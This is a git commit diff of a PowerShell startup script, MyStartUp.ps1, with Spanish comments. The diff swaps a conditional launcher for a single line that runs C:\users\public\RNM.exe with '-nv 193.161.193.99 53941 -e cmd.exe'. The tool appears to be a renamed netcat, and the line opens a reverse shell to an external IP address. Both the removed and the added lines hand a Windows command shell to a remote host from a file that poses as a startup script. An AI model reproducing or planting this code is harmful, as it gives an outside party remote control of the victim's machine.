1118792434209e4f07db8cb57216c1740ba3d6fb
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-06-16 00:28:38 -0400

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,15 +1,1 @@
-# Obtener el directorio actual
-$directorioActual = Get-Location
-
-# Definir el directorio objetivo
-$directorioObjetivo = "C:\users\alooo\Downloads"
-
-# Verificar si el directorio actual es el directorio objetivo
-if ($directorioActual.Path -eq $directorioObjetivo) {
-    # Definir el comando y los argumentos
-    $ejecutable = "C:\users\public\RNM.exe"
-    $argumentos = "-nv 193.161.193.99 53941 -e cmd.exe"
-
-    # Ejecutar el comando
-    Start-Process -FilePath $ejecutable -ArgumentList $argumentos -NoNewWindow -Wait
-}
+C:\users\public\RNM.exe -nv 193.161.193.99 53941 -e cmd.exe
